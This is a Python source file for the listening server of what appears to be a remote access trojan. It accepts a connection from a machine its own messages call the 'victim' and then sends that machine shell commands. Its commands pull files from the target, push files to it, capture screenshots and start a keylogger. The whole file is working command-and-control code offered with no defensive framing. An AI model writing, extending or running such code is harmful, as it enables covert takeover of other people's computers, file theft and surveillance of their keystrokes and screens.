# !/usr/bin/python
import socket
from termcolor import colored
import json
import base64

count = 1
# SERVER_ADDRESS = "192.168.1.128"
SERVER_ADDRESS = "10.177.186.2"
SERVER_PORT = 54321

def reliable_send(data):
    """Send data to the client reliably by encoding to JSON."""
    try:
        json_data = json.dumps(data)
        json_data = json_data.encode('utf-8')
        target.send(json_data)
    except Exception as e:
        print("Error while send message to victim", e)


def reliable_recv():
    """Receive data from the client reliably by decoding from JSON."""
    try:

        # print("reliable_recv()")
        data = ""
        while True:
            try:
                # print("while True")
                chunk_recv = target.recv(1024).decode()
                # print("chunk_recv = ", str(chunk_recv))
                if not chunk_recv or len(chunk_recv) == 0 or chunk_recv == '':
                    # print("not chunk_recv or len(chunk_recv)")
                    break
                data = data + chunk_recv
                # print("data.decode('utf-8') = ", data)

                return json.loads(data)
            except ValueError:
                continue


    except Exception as e:
        print("Eroare în timpul primirii datelor de la client:", e)
        return None


def shell():
    global count
    while True:
        command = input("* Shell#-%s: " % str(ip))
        reliable_send(command)

        if command == 'q':
            break
        elif command.strip().startswith("cd") and len(command.strip()) > 2:
            continue
        elif command[:8] == "download": #DOWNLOAD FROM TARGET TO SERVER
            with open(command[9:], "wb") as file:
                file_data = reliable_recv()
                file.write(base64.b64decode(file_data))
        elif command[:6] == "upload":
            try:
                with open(command[7:], "rb") as fin:
                    reliable_send(base64.b64encode(fin.read()))
            except ValueError:
                failed = "Failed to upload"
                reliable_send(base64.b64encode(failed))

        elif command[:10] == "screenshot":
            with open("screenshot_%d.png" % count, 'wb') as ss:
                image = reliable_recv()
                image_decoded = base64.b64decode(image).decode()
                if image_decoded[:4] == "[!!]":
                    print(image_decoded)
                else:
                    ss.write(image_decoded)
                    count += 1
        elif command[:12] == "keylog_start":
            continue
        else:
            result = reliable_recv()
            print("REZULTAT VENIT DE LA VICTIMA: ", result)


def server():
    global s, ip, target
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    s.bind((SERVER_ADDRESS, SERVER_PORT))
    s.listen(5)

    print(colored("[+] Listening For Incoming connecions", "green"))

    target, ip = s.accept()
    print(colored("[+] Connection established from %s cu target %s" % (str(ip), str(target)), "green"))


server()
shell()
s.close()
